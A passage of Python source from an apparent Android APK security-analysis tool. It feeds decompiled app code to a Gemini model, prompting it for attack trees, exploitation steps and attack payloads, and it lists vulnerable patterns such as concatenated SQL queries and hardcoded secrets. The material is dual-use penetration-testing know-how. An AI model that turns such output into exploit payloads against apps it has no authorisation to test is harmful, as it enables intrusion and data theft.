    1. Analyze the actual source code of ALL exposed components
    2. Identify real vulnerabilities (SQL injection, auth bypass, etc.)
    3. Create an attack tree showing actual attack paths found in the code
    4. Connect vulnerabilities to their potential impacts
    5. Validate findings against false positive patterns
    
    Args:
        attack_surface: The attack surface map from static analysis
        output_dir: JADX output directory containing decompiled sources
        decompiled_findings: Optional list of findings from pattern-based scanners
    
    Returns:
        Mermaid diagram code showing AI-discovered attack paths
    """
    if not settings.gemini_api_key:
        # Fall back to static generation
        return _generate_attack_tree_mermaid(
            attack_surface.package_name,
            attack_surface.attack_vectors,
            attack_surface.deep_links,
            attack_surface.exposed_data_paths
        )
    
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        return _generate_attack_tree_mermaid(
            attack_surface.package_name,
            attack_surface.attack_vectors,
            attack_surface.deep_links,
            attack_surface.exposed_data_paths
        )
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # === PHASE 1: Collect comprehensive code for ALL attack vectors ===
        component_code_samples = []
        analyzed_components = set()
        
        # Analyze ALL attack vector components (not just 15)
        for vector in attack_surface.attack_vectors[:30]:
            component_name = vector.component
            if component_name in analyzed_components:
                continue
            
            relative_path = component_name.replace('.', '/') + '.java'
            
            for java_file in sources_dir.rglob('*.java'):
                if java_file.name == relative_path.split('/')[-1]:
                    try:
                        code = java_file.read_text(encoding='utf-8', errors='ignore')[:10000]  # Increased from 6000
                        component_code_samples.append({
                            'component': vector.component.split('.')[-1],
                            'full_name': vector.component,
                            'type': vector.vector_type,
                            'severity': vector.severity,
                            'code': code,
                            'file_path': str(java_file.relative_to(output_dir))
                        })
                        analyzed_components.add(component_name)
                        break
                    except:
                        pass
        
        # === PHASE 2: Security-critical files with expanded patterns ===
        security_patterns = {
            'authentication': ['auth', 'login', 'logout', 'signin', 'signup', 'register', 'session', 'oauth', 'sso'],
            'credentials': ['password', 'credential', 'secret', 'token', 'apikey', 'api_key'],
            'cryptography': ['crypto', 'cipher', 'encrypt', 'decrypt', 'aes', 'rsa', 'hash', 'md5', 'sha'],
            'database': ['sql', 'query', 'database', 'dao', 'repository', 'cursor', 'sqlite', 'room'],
            'network': ['http', 'https', 'url', 'request', 'response', 'retrofit', 'okhttp', 'api', 'rest'],
            'webview': ['webview', 'javascript', 'bridge', 'webkit'],
            'storage': ['preference', 'sharedpref', 'file', 'storage', 'cache', 'save', 'load'],
            'permission': ['permission', 'access', 'privilege', 'grant', 'deny'],
            'sensitive_data': ['user', 'account', 'profile', 'personal', 'private', 'pii', 'ssn', 'credit'],
            'payment': ['payment', 'billing', 'transaction', 'purchase', 'wallet', 'card'],
            'deeplink': ['deeplink', 'scheme', 'intent', 'uri', 'link'],
            'broadcast': ['broadcast', 'receiver', 'intent'],
        }
        
        # Flatten patterns for searching
        all_security_keywords = set()
        for patterns in security_patterns.values():
            all_security_keywords.update(patterns)
        
        for java_file in sources_dir.rglob('*.java'):
            if len(component_code_samples) >= 80:  # Increased from 50 for more comprehensive analysis
                break
            file_lower = java_file.name.lower()
            
            # Check against security patterns
            matched_category = None
            for category, patterns in security_patterns.items():
                if any(pattern in file_lower for pattern in patterns):
                    matched_category = category
                    break
            
            if matched_category:
                if java_file.stem not in analyzed_components:
                    try:
                        code = java_file.read_text(encoding='utf-8', errors='ignore')[:12000]  # Increased from 8000
                        component_code_samples.append({
                            'component': java_file.stem,
                            'full_name': java_file.stem,
                            'type': f'security_class_{matched_category}',
                            'severity': 'high',
                            'code': code,
                            'file_path': str(java_file.relative_to(output_dir)),
                            'category': matched_category
                        })
                        analyzed_components.add(java_file.stem)
                    except:
                        pass
        
        # === PHASE 3: Build comprehensive code context ===
        code_context = ""
        code_stats = {'total_analyzed': len(component_code_samples), 'categories': set()}
        
        for sample in component_code_samples[:60]:  # Increased from 35 for deeper analysis
            category = sample.get('category', sample['type'])
            code_stats['categories'].add(category)
            code_context += f"""
========================================
FILE: {sample.get('file_path', sample['component'])}
COMPONENT: {sample['component']} ({sample['type']}, {sample['severity']})
CATEGORY: {category}
========================================
{sample['code'][:10000]}

"""
        
        # === PHASE 4: Build comprehensive attack surface summary ===
        attack_summary = f"""
=== ATTACK SURFACE OVERVIEW ===
Package: {attack_surface.package_name}
Total Attack Vectors: {attack_surface.total_attack_vectors}
Risk Level: {attack_surface.risk_level.upper()}
Exposure Score: {attack_surface.overall_exposure_score}/100
Risk Breakdown: Critical={attack_surface.risk_breakdown.get('critical', 0)}, High={attack_surface.risk_breakdown.get('high', 0)}, Medium={attack_surface.risk_breakdown.get('medium', 0)}, Low={attack_surface.risk_breakdown.get('low', 0)}

=== ALL ATTACK VECTORS ({len(attack_surface.attack_vectors)}) ===
"""
        # Group by type
        vector_groups = {}
        for v in attack_surface.attack_vectors:
            vtype = v.vector_type
            if vtype not in vector_groups:
                vector_groups[vtype] = []
            vector_groups[vtype].append(v)
        
        for vtype, vectors in vector_groups.items():
            attack_summary += f"\n{vtype.upper().replace('_', ' ')} ({len(vectors)}):\n"
            for v in vectors[:10]:
                attack_summary += f"  - [{v.severity.upper()}] {v.component.split('.')[-1]}: {v.description[:80]}\n"
        
        # Deep links
        if attack_surface.deep_links:
            attack_summary += f"\n=== DEEP LINKS ({len(attack_surface.deep_links)}) ===\n"
            for dl in attack_surface.deep_links[:10]:
                attack_summary += f"  - {dl.scheme}://{dl.host}{dl.path or ''}  {dl.handling_activity.split('.')[-1]}\n"
        
        # Exposed data paths
        if attack_surface.exposed_data_paths:
            attack_summary += f"\n=== EXPOSED DATA PATHS ({len(attack_surface.exposed_data_paths)}) ===\n"
            for dp in attack_surface.exposed_data_paths[:10]:
                attack_summary += f"  - content://{dp.authority}{dp.path or ''} (readable:{dp.is_readable}, writable:{dp.is_writable})\n"
        
        # Priority targets
        if attack_surface.priority_targets:
            attack_summary += f"\n=== PRIORITY TARGETS ===\n"
            for target in attack_surface.priority_targets:
                attack_summary += f"  {target}\n"
        
        # Code analysis stats
        attack_summary += f"""
=== CODE ANALYSIS STATS ===
Classes Analyzed: {code_stats['total_analyzed']}
Security Categories Found: {', '.join(code_stats['categories'])}
"""
        
        # Add decompiled findings to attack summary
        decompiled_findings_section = ""
        if decompiled_findings:
            critical = [f for f in decompiled_findings if f.get('severity') == 'critical']
            high = [f for f in decompiled_findings if f.get('severity') == 'high']
            decompiled_findings_section = f"""
=== VERIFIED VULNERABILITIES FROM PATTERN SCAN ({len(decompiled_findings)} total) ===
These are CONFIRMED vulnerabilities with exact code locations - incorporate them into the attack tree!

CRITICAL ({len(critical)}):
"""
            for f in critical[:8]:
                decompiled_findings_section += f" {f.get('title')} at {f.get('file_path')}:{f.get('line_number')} - {f.get('exploitation', '')[:100]}\n"
            
            decompiled_findings_section += f"\nHIGH ({len(high)}):\n"
            for f in high[:6]:
                decompiled_findings_section += f" {f.get('title')} at {f.get('file_path')}:{f.get('line_number')}\n"
        
        prompt = f"""You are an elite Android penetration tester creating a COMPREHENSIVE ATTACK TREE diagram from deep source code analysis.

You have been provided with EXTENSIVE decompiled source code from the APK. Your job is to:
1. READ AND ANALYZE every piece of code provided
2. IDENTIFY specific, real vulnerabilities (not theoretical)
3. CREATE an accurate attack tree showing exploitation paths
4. INCLUDE the verified vulnerabilities from the pattern scan in your attack tree

=== COMPLETE ATTACK SURFACE DATA ===
{attack_summary}
{decompiled_findings_section}

=== DECOMPILED SOURCE CODE ({code_stats['total_analyzed']} classes analyzed) ===
{code_context}

=== VULNERABILITY PATTERNS TO LOOK FOR ===

**SQL INJECTION (look for these exact patterns):**
 VULNERABLE: db.rawQuery("SELECT * FROM users WHERE id=" + userId, null)
 VULNERABLE: "SELECT * FROM " + tableName + " WHERE " + column + "='" + value + "'"
 VULNERABLE: cursor = db.query(table, null, "id=" + id, null, null, null, null)
 SAFE: db.query(table, columns, "id=?", new String[]{{id}}, ...)
 SAFE: db.rawQuery("SELECT * FROM users WHERE id=?", new String[]{{userId}})

**AUTHENTICATION BYPASS:**
 VULNERABLE: Exported activity accesses sensitive data without calling checkLogin()/isLoggedIn()
 VULNERABLE: Activity with exported=true that shows user data, settings, or private content
 VULNERABLE: Service that processes sensitive operations without authentication check
 SAFE: Activity has onCreate check: if(!SessionManager.isLoggedIn()) finish();

**DATA LEAKAGE:**
 VULNERABLE: Log.d("Auth", "Password: " + password)
 VULNERABLE: Log.i(TAG, "User credentials: " + username + ":" + pass)
 VULNERABLE: Writing sensitive data to external storage without encryption
 SAFE: Log.d("Loading", "Starting activity...")
 SAFE: SharedPreferences with MODE_PRIVATE for non-sensitive data

**WEBVIEW VULNERABILITIES:**
 VULNERABLE: webView.setJavaScriptEnabled(true) + webView.loadUrl(getIntent().getData())
 VULNERABLE: addJavascriptInterface(new JsInterface(), "Android") exposing sensitive methods
 VULNERABLE: setAllowFileAccess(true) + setAllowContentAccess(true) + loadUrl(untrusted)
 SAFE: JavaScript enabled but only loading hardcoded trusted URLs
 SAFE: WebViewClient with shouldOverrideUrlLoading() that validates URLs

**INTENT INJECTION / EXPORTED COMPONENT ABUSE:**
 VULNERABLE: startActivity((Intent)getIntent().getParcelableExtra("intent"))
 VULNERABLE: getIntent().getStringExtra("url") used directly in network request
 VULNERABLE: Exported receiver that executes commands from intent extras
 SAFE: Intent extras validated before use
 SAFE: Exported component has android:permission attribute

**INSECURE CRYPTOGRAPHY:**
 VULNERABLE: Cipher.getInstance("DES") or Cipher.getInstance("AES/ECB/...")
 VULNERABLE: MessageDigest.getInstance("MD5") for password hashing
 VULNERABLE: SecretKeySpec with hardcoded byte array
 VULNERABLE: new SecureRandom(seed) with fixed seed value
 SAFE: Cipher.getInstance("AES/GCM/NoPadding")
 SAFE: Keys from Android Keystore

**HARDCODED SECRETS:**
 VULNERABLE: String API_KEY = "AIza..." or "sk_live_..."
 VULNERABLE: String password = "admin123"
 VULNERABLE: byte[] secretKey = {{0x01, 0x02, ...}}
 SAFE: Keys loaded from secure storage or fetched from server

=== YOUR TASK ===

Create a Mermaid attack tree that shows:
1. **ROOT GOAL**: The main objective an attacker would target (based on app purpose)
2. **ENTRY POINTS**: All exported components, deep links, and exposed APIs
3. **VULNERABILITIES**: ONLY vulnerabilities you can QUOTE from the code above
4. **EXPLOITATION**: How each vulnerability leads to impact
5. **IMPACTS**: Data breach, account takeover, privilege escalation, etc.

=== MERMAID FORMAT ===
Use flowchart TD with proper icon syntax:
- Node syntax: NODE@{{ icon: "icon", form: "square", label: "Text" }}
- Subgraphs: subgraph NAME["Title"]
- Connections: A --> B or A -->|"label"| B

VALID ICONS:
- mdi:cellphone-android (app)
- fa:window-maximize (activity)
- fa:cogs (service)
- fa:tower-broadcast (receiver)
- fa:database (provider/data)
- fa:link (deep link)
- fa:bug (critical)
- fa:triangle-exclamation (high)
- mdi:alert (medium)
- fa:code (injection)
- fa:unlock (auth bypass)
- fa:download (data leak)
- fa:globe (network)
- fa:key (crypto/secrets)
- fa:lock (security)
- fa:user (user data)
- fa:file-code (file access)
- fa:shield-halved (protection)
- fa:credit-card (payment)
- fa:eye (privacy)

=== CRITICAL RULES ===

1. **EVIDENCE REQUIRED**: For each vulnerability, you MUST be able to point to specific code
2. **NO ASSUMPTIONS**: Don't assume SQL injection just because there's a database class
3. **ACKNOWLEDGE PROTECTIONS**: If you see input validation, parameterized queries, or auth checks - the code is NOT vulnerable
4. **USE ACTUAL CLASS NAMES**: Reference real class names from the code (e.g., "LoginActivity" not "Login")
5. **MARK UNCERTAINTY**: Use "Potential" prefix when unsure
6. **15-35 NODES MAX**: Keep diagram readable but comprehensive
7. **LOGICAL FLOW**: Entry Point  Vulnerability  Exploitation  Impact

=== OUTPUT FORMAT ===

If you find REAL vulnerabilities:
- Create detailed attack tree with specific findings
- Reference exact class names and vulnerability types
- Show complete attack chains from entry to impact

If NO vulnerabilities found:
- Show attack surface (entry points)
- Add node: "No critical vulnerabilities confirmed in analyzed code"
- List areas requiring manual review

Return ONLY valid Mermaid code starting with "flowchart TD". No explanations or markdown."""

        response = sync_gemini_request_with_retry(
            lambda: client.models.generate_content(
                model=settings.gemini_model_id,
                contents=prompt,
                config=types.GenerateContentConfig(
                    thinking_config=types.ThinkingConfig(thinking_level="medium"),
                    max_output_tokens=4000,
                )
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=120.0,
            operation_name="Attack tree Mermaid generation"
        )
        
        if response is not None and response.text:
            diagram = response.text.strip()
            
            # Clean up response
            if "```mermaid" in diagram:
                diagram = diagram.split("```mermaid")[1].split("```")[0].strip()
            elif "```" in diagram:
                diagram = diagram.split("```")[1].split("```")[0].strip()
            
            # Ensure it starts correctly
            if not diagram.startswith("flowchart"):
                diagram = "flowchart TD\n" + diagram
            
            # Sanitize icons
            diagram = _sanitize_mermaid_icons(diagram)
            
            return diagram
        
    except Exception as e:
        import traceback
        traceback.print_exc()
    
    # Fall back to static generation
    return _generate_attack_tree_mermaid(
        attack_surface.package_name,
        attack_surface.attack_vectors,
        attack_surface.deep_links,
        attack_surface.exposed_data_paths
    )


def _generate_attack_tree_mermaid(
    package: str,
    vectors: List[AttackVector],
    deep_links: List[DeepLinkEntry],
    data_paths: List[ExposedDataPath]
) -> str:
    """Generate a mermaid attack tree diagram using validated Mermaid icons."""
    lines = ["flowchart TD"]
    
    # Root node with target icon (using validated icon)
    safe_package = package.replace('"', "'")
    lines.append(f'    ROOT@{{ icon: "mdi:cellphone-android", form: "square", label: "{safe_package}" }}')
    
    # Group by vector type
    activities = [v for v in vectors if v.vector_type == "exported_activity"]
    services = [v for v in vectors if v.vector_type == "exported_service"]
    receivers = [v for v in vectors if v.vector_type == "exported_receiver"]
    providers = [v for v in vectors if v.vector_type == "exported_provider"]
    dl_vectors = [v for v in vectors if v.vector_type == "deep_link"]
    
    # Helper for severity icons - using validated icons only
    def get_severity_icon(severity: str) -> str:
        if severity == "critical":
            return "fa:bug"  # Valid icon for critical
        elif severity == "high":
            return "fa:triangle-exclamation"  # Valid icon for high
        else:
            return "mdi:alert"  # Valid icon for medium/low
    
    if activities:
        lines.append('    ACT@{ icon: "fa:window-maximize", form: "square", label: "Exported Activities" }')
        lines.append("    ROOT --> ACT")
        for i, v in enumerate(activities[:5]):
            severity_icon = get_severity_icon(v.severity)
            safe_name = v.component.split('.')[-1].replace('"', "'")
            lines.append(f'    ACT{i}@{{ icon: "{severity_icon}", form: "square", label: "{safe_name}" }}')
            lines.append(f"    ACT --> ACT{i}")
    
    if services:
        lines.append('    SVC@{ icon: "fa:cogs", form: "square", label: "Exported Services" }')
        lines.append("    ROOT --> SVC")
        for i, v in enumerate(services[:5]):
            severity_icon = get_severity_icon(v.severity)
            safe_name = v.component.split('.')[-1].replace('"', "'")
            lines.append(f'    SVC{i}@{{ icon: "{severity_icon}", form: "square", label: "{safe_name}" }}')
            lines.append(f"    SVC --> SVC{i}")
    
    if receivers:
        lines.append('    RCV@{ icon: "fa:tower-broadcast", form: "square", label: "Broadcast Receivers" }')
        lines.append("    ROOT --> RCV")
        for i, v in enumerate(receivers[:5]):
            severity_icon = get_severity_icon(v.severity)
            safe_name = v.component.split('.')[-1].replace('"', "'")
            lines.append(f'    RCV{i}@{{ icon: "{severity_icon}", form: "square", label: "{safe_name}" }}')
            lines.append(f"    RCV --> RCV{i}")
    
    if providers:
        lines.append('    PRV@{ icon: "fa:database", form: "square", label: "Content Providers" }')
        lines.append("    ROOT --> PRV")
        for i, v in enumerate(providers[:3]):
            safe_name = v.component.split('.')[-1].replace('"', "'")
            lines.append(f'    PRV{i}@{{ icon: "fa:bug", form: "square", label: "{safe_name}" }}')
            lines.append(f"    PRV --> PRV{i}")
        lines.append('    SQLI@{ icon: "fa:code", form: "square", label: "SQL Injection" }')
        lines.append("    PRV --> SQLI")
        lines.append('    PATH@{ icon: "fa:folder", form: "square", label: "Path Traversal" }')
        lines.append("    PRV --> PATH")
    
    if deep_links:
        lines.append('    DL@{ icon: "fa:link", form: "square", label: "Deep Links" }')
        lines.append("    ROOT --> DL")
        schemes = set(dl.scheme for dl in deep_links if dl.scheme not in ('http', 'https'))
        for idx, scheme in enumerate(list(schemes)[:3]):
            safe_id = f"DL_{idx}"
            lines.append(f'    {safe_id}@{{ icon: "fa:globe", form: "square", label: "{scheme}://" }}')
            lines.append(f"    DL --> {safe_id}")
    
    # Add attack outcomes subgraph with validated icons
    lines.append("    ")
    lines.append('    subgraph IMPACTS["Potential Impacts"]')
    lines.append('    IMP1@{ icon: "fa:unlock", form: "square", label: "Auth Bypass" }')
    lines.append('    IMP2@{ icon: "fa:download", form: "square", label: "Data Exfil" }')
    lines.append('    IMP3@{ icon: "fa:code", form: "square", label: "Injection" }')
    lines.append('    IMP4@{ icon: "fa:key", form: "square", label: "Priv Esc" }')
    lines.append("    end")
    
    return "\n".join(lines)


# ============================================================================
# AI-Enhanced Attack Surface Analysis
# ============================================================================

async def enhance_attack_surface_with_ai(
    attack_surface: AttackSurfaceMap,
    output_dir: Path
) -> AttackSurfaceMap:
    """
    Enhance attack surface map with AI analysis of decompiled source code.
    
    Analyzes the actual code of each exposed component to find real vulnerabilities
    and generate more accurate exploitation steps.
    
    Args:
        attack_surface: Basic attack surface map from static analysis
        output_dir: JADX output directory containing decompiled sources
    
    Returns:
        Enhanced AttackSurfaceMap with AI-powered analysis
    """
    if not settings.gemini_api_key:
        return attack_surface
    
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        return attack_surface
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # Collect source code for each attack vector component
        component_code = {}
        for vector in attack_surface.attack_vectors[:20]:  # Limit to top 20 vectors
            component_name = vector.component
            # Convert component name to file path
            # e.g., com.example.LoginActivity -> com/example/LoginActivity.java
            relative_path = component_name.replace('.', '/') + '.java'
            java_file = sources_dir / relative_path
            
            if java_file.exists():
                try:
                    content = java_file.read_text(encoding='utf-8', errors='ignore')
                    if 100 < len(content) < 50000:
                        component_code[component_name] = content[:15000]  # Limit size
                except Exception:
                    pass
        
        if not component_code:
            # Try searching for class files
            for vector in attack_surface.attack_vectors[:15]:
                class_name = vector.component.split('.')[-1]
                for java_file in sources_dir.rglob(f"{class_name}.java"):
                    try:
                        content = java_file.read_text(encoding='utf-8', errors='ignore')
                        if 100 < len(content) < 50000:
                            component_code[vector.component] = content[:15000]
                            break
                    except Exception:
                        pass
        
        if not component_code:
            return attack_surface
        
        # Build context for AI analysis
        code_context = "\n\n".join([
            f"### {name}\n```java\n{code}\n```"
            for name, code in list(component_code.items())[:10]
        ])
        
        # Create list of components being analyzed
        components_list = "\n".join([
            f"- {v.name} ({v.vector_type}, {v.severity})"
            for v in attack_surface.attack_vectors[:15]
        ])
        
        prompt = f"""You are an expert Android security researcher performing attack surface analysis.

## TARGET APP
Package: {attack_surface.package_name}
Total Attack Vectors: {attack_surface.total_attack_vectors}
Risk Level: {attack_surface.risk_level}

## EXPOSED COMPONENTS (Attack Vectors)
{components_list}

## DECOMPILED SOURCE CODE
{code_context}

## YOUR TASK
Analyze the source code of the exposed components and provide:

1. **Real Vulnerabilities Found**: Identify actual security issues in the code (not generic issues)
2. **Specific Exploitation Steps**: Based on what you see in the code, provide concrete steps
3. **Attack Chains**: How can multiple vulnerabilities be chained together?
4. **Input Validation Issues**: What inputs are not properly validated?
5. **Data Leakage Points**: Where does sensitive data leak?

Return a JSON response with this structure:
{{
    "enhanced_vectors": [
        {{
            "component": "full.component.name",
            "ai_severity": "critical|high|medium|low",
            "vulnerabilities_found": [
                {{
                    "type": "SQL Injection|XSS|Auth Bypass|Path Traversal|etc",
                    "description": "Specific description of the vulnerability",
                    "code_location": "Method or line where the issue exists",
                    "evidence": "Code snippet showing the vulnerability"
                }}
            ],
            "exploitation_steps": [
                "Step 1: Specific action based on code analysis",
                "Step 2: ...",
                "Step 3: ..."
            ],
            "attack_payload": "Specific payload or intent to exploit this",
            "impact": "What an attacker could achieve"
        }}
    ],
    "attack_chains": [
        {{
            "name": "Chain name",
            "steps": ["Step 1: Exploit X", "Step 2: Use access to Y"],
            "final_impact": "Ultimate impact"
        }}
    ],
    "overall_assessment": "Brief summary of the most critical findings",
    "priority_targets": ["Component 1", "Component 2", "Component 3"]
}}

Focus on REAL issues you can see in the code. Don't make up generic vulnerabilities.
If a component looks secure, say so."""

        # Use retry helper for reliability
        response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=180.0,
            operation_name="Attack surface AI enhancement"
        )
        
        if response is None or not response.text:
            return attack_surface
        
        # Parse AI response
        response_text = response.text.strip()
        if response_text.startswith("```json"):
            response_text = response_text[7:]
        if response_text.startswith("```"):
            response_text = response_text[3:]
        if response_text.endswith("```"):
            response_text = response_text[:-3]
        
        import json
        ai_analysis = json.loads(response_text.strip())
        
        # Enhance attack vectors with AI findings
        enhanced_vectors = []
        ai_vectors_map = {v.get("component"): v for v in ai_analysis.get("enhanced_vectors", [])}
        
        for vector in attack_surface.attack_vectors:
            ai_info = ai_vectors_map.get(vector.component)
            if ai_info:
                # Update severity if AI found it more critical
                severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
                ai_severity = ai_info.get("ai_severity", vector.severity)
                if severity_order.get(ai_severity, 3) < severity_order.get(vector.severity, 3):
                    vector = AttackVector(
                        id=vector.id,
                        name=vector.name,
                        vector_type=vector.vector_type,
                        component=vector.component,
                        severity=ai_severity,
                        description=vector.description,
                        exploitation_steps=ai_info.get("exploitation_steps", vector.exploitation_steps),
                        required_permissions=vector.required_permissions,
                        adb_command=ai_info.get("attack_payload") or vector.adb_command,
                        intent_example=vector.intent_example,
                        mitigation=vector.mitigation
                    )
                else:
                    # Update exploitation steps if AI provided better ones
                    if ai_info.get("exploitation_steps"):
                        vector = AttackVector(
                            id=vector.id,
                            name=vector.name,
                            vector_type=vector.vector_type,
                            component=vector.component,
                            severity=vector.severity,
                            description=vector.description,
                            exploitation_steps=ai_info.get("exploitation_steps"),
                            required_permissions=vector.required_permissions,
                            adb_command=ai_info.get("attack_payload") or vector.adb_command,
                            intent_example=vector.intent_example,
                            mitigation=vector.mitigation
                        )
                
                # Add AI-found vulnerabilities to description
                vulns = ai_info.get("vulnerabilities_found", [])
                if vulns:
                    vuln_desc = "; ".join([f"{v.get('type')}: {v.get('description')}" for v in vulns[:3]])
                    vector = AttackVector(
                        id=vector.id,
                        name=vector.name,
                        vector_type=vector.vector_type,
                        component=vector.component,
                        severity=vector.severity,
                        description=f"{vector.description}. AI FINDINGS: {vuln_desc}",
                        exploitation_steps=vector.exploitation_steps,
                        required_permissions=vector.required_permissions,
                        adb_command=vector.adb_command,
                        intent_example=vector.intent_example,
                        mitigation=vector.mitigation
                    )
            
            enhanced_vectors.append(vector)
        
        # Update priority targets from AI analysis
        ai_priority = ai_analysis.get("priority_targets", [])
        if ai_priority:
            priority_targets = [f"[AI] {t}" for t in ai_priority[:5]]
        else:
            priority_targets = attack_surface.priority_targets
        
        # Recalculate risk breakdown
        risk_breakdown = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        for v in enhanced_vectors:
            risk_breakdown[v.severity] = risk_breakdown.get(v.severity, 0) + 1
        
        # Recalculate risk level
        if risk_breakdown['critical'] > 0:
            risk_level = "critical"
        elif risk_breakdown['high'] >= 3:
            risk_level = "high"
        elif risk_breakdown['medium'] >= 3:
            risk_level = "medium"
        else:
            risk_level = attack_surface.risk_level
        
        # Add attack chains to automated tests
        enhanced_tests = list(attack_surface.automated_tests)
        for chain in ai_analysis.get("attack_chains", []):
            enhanced_tests.append({
                'name': f"[AI Chain] {chain.get('name', 'Unknown')}",
                'command': "",
                'description': f"Attack chain: {' -> '.join(chain.get('steps', []))}. Impact: {chain.get('final_impact', 'Unknown')}"
            })
        
        return AttackSurfaceMap(
            package_name=attack_surface.package_name,
            total_attack_vectors=len(enhanced_vectors),
            attack_vectors=enhanced_vectors,
            exposed_data_paths=attack_surface.exposed_data_paths,
            deep_links=attack_surface.deep_links,
            ipc_endpoints=attack_surface.ipc_endpoints,
            overall_exposure_score=attack_surface.overall_exposure_score,
            risk_level=risk_level,
            risk_breakdown=risk_breakdown,
            priority_targets=priority_targets,
            automated_tests=enhanced_tests,
            mermaid_attack_tree=attack_surface.mermaid_attack_tree
        )
        
    except json.JSONDecodeError as e:
        logger.warning(f"Failed to parse AI attack surface response: {e}")
        return attack_surface
    except Exception as e:
        logger.error(f"AI attack surface enhancement failed: {e}")
        return attack_surface


# ============================================================================
# Obfuscation Detection and Analysis
# ============================================================================

@dataclass
class ObfuscationIndicator:
    """A single obfuscation indicator found in the APK."""
    indicator_type: str  # proguard, dexguard, string_encryption, control_flow, etc.
    confidence: str  # high, medium, low
    description: str
    evidence: List[str]  # Specific examples found
    location: Optional[str] = None  # File or class where found
    deobfuscation_hint: Optional[str] = None


@dataclass
class StringEncryptionPattern:
    """Detected string encryption pattern."""
    pattern_name: str
    class_name: str
    method_name: str
    encrypted_strings_count: int
    decryption_method_signature: Optional[str] = None
    sample_encrypted_values: List[str] = field(default_factory=list)
    suggested_frida_hook: Optional[str] = None


@dataclass
class ClassNamingAnalysis:
    """Analysis of class naming patterns for obfuscation detection."""
    total_classes: int
    single_letter_classes: int
    short_name_classes: int  # 2-3 chars
    meaningful_name_classes: int
    obfuscation_ratio: float  # 0.0 to 1.0
    sample_obfuscated_names: List[str]
    sample_original_names: List[str]


@dataclass
class ControlFlowObfuscation:
    """Detected control flow obfuscation patterns."""
    pattern_type: str  # switch_dispatch, opaque_predicates, dead_code, etc.
    affected_methods: int
    sample_classes: List[str]
    complexity_score: float  # Higher = more obfuscated


@dataclass
class NativeProtection:
    """Detected native code protection."""
    has_native_libs: bool
    native_lib_names: List[str]
    protection_indicators: List[str]  # packing, anti-debug, integrity checks
    jni_functions: List[str]


@dataclass
class ObfuscationAnalysisResult:
    """Complete obfuscation analysis result."""
    package_name: str
    overall_obfuscation_level: str  # none, light, moderate, heavy, extreme
    obfuscation_score: int  # 0-100
    detected_tools: List[str]  # ProGuard, DexGuard, Allatori, etc.
    
    # Detailed analysis
    indicators: List[ObfuscationIndicator]
    class_naming: ClassNamingAnalysis
    string_encryption: List[StringEncryptionPattern]
    control_flow: List[ControlFlowObfuscation]
    native_protection: NativeProtection
    
    # Recommendations
    deobfuscation_strategies: List[str]
    recommended_tools: List[str]
    frida_hooks: List[str]  # Auto-generated Frida hooks
    
    # Metadata
    analysis_time: float
    warnings: List[str]
    
    # AI-enhanced fields
    ai_analysis_summary: Optional[str] = None  # AI summary of obfuscation analysis
    reverse_engineering_difficulty: Optional[str] = None  # AI assessment of RE difficulty
    ai_recommended_approach: Optional[str] = None  # AI recommended approach for RE


def analyze_apk_obfuscation(apk_path: Path) -> ObfuscationAnalysisResult:
    """
    Analyze an APK for obfuscation techniques using FAST lightweight analysis.
    
    Uses direct DEX parsing instead of full AnalyzeAPK() to complete in seconds
    instead of minutes for large APKs.
    
    Detects:
    - ProGuard/R8 class renaming
    - DexGuard commercial protection
    - String encryption patterns
    - Native code protection
    """
    import time
    import zipfile
    import struct
    from androguard.core.apk import APK
    
    start_time = time.time()
    warnings = []
    
    try:
        # Use lightweight APK parsing (fast - only manifest/resources)
        apk = APK(str(apk_path))
        package_name = apk.get_package() or "unknown"
    except Exception as e:
        return ObfuscationAnalysisResult(
            package_name="unknown",
            overall_obfuscation_level="unknown",
            obfuscation_score=0,
            detected_tools=[],
            indicators=[],
            class_naming=ClassNamingAnalysis(0, 0, 0, 0, 0.0, [], []),
            string_encryption=[],
            control_flow=[],
            native_protection=NativeProtection(False, [], [], []),
            deobfuscation_strategies=[],
            recommended_tools=[],
            frida_hooks=[],
            analysis_time=time.time() - start_time,
            warnings=[f"Failed to analyze APK: {str(e)}"]
        )
    
    indicators = []
    detected_tools = []
    
    # Fast class name extraction from DEX without full analysis
    class_names = _extract_class_names_fast(apk_path)
    class_naming = _analyze_class_naming_fast(class_names, package_name)
    
    # Fast obfuscation detection based on class names and APK structure
    indicators.extend(_detect_proguard_indicators_fast(apk, class_naming))
    indicators.extend(_detect_dexguard_indicators_fast(apk))
    
    # Fast string pattern analysis (sample DEX strings)
    string_encryption = _analyze_string_encryption_fast(apk_path)
    
    # Control flow analysis skipped (requires full DEX analysis - too slow)
    control_flow = []
    
    # Analyze native protection (fast - just checks for .so files)
    native_protection = _analyze_native_protection(apk)
    
    # Determine detected tools
    detected_tools = _identify_obfuscation_tools_fast(indicators, class_naming, string_encryption)
    
    # Calculate overall score
    obfuscation_score = _calculate_obfuscation_score_fast(
        class_naming, indicators, string_encryption, native_protection
    )
    
    # Determine level
    if obfuscation_score < 15:
        level = "none"
    elif obfuscation_score < 35:
        level = "light"
    elif obfuscation_score < 60:
        level = "moderate"
    elif obfuscation_score < 85:
        level = "heavy"
    else:
        level = "extreme"
    
    # Generate recommendations
    strategies = _generate_deobfuscation_strategies_fast(detected_tools, level)
    recommended_tools = _recommend_deobfuscation_tools(detected_tools, level)
    frida_hooks = _generate_frida_hooks_fast(package_name, level)
    
    return ObfuscationAnalysisResult(
        package_name=package_name,
        overall_obfuscation_level=level,
        obfuscation_score=obfuscation_score,
        detected_tools=detected_tools,
        indicators=indicators,
        class_naming=class_naming,
        string_encryption=string_encryption,
        control_flow=control_flow,
        native_protection=native_protection,
        deobfuscation_strategies=strategies,
        recommended_tools=recommended_tools,
        frida_hooks=frida_hooks,
        analysis_time=time.time() - start_time,
        warnings=warnings
    )


async def analyze_apk_obfuscation_ai_enhanced(
    apk_path: Path,
    output_dir: Optional[Path] = None
) -> ObfuscationAnalysisResult:
    """
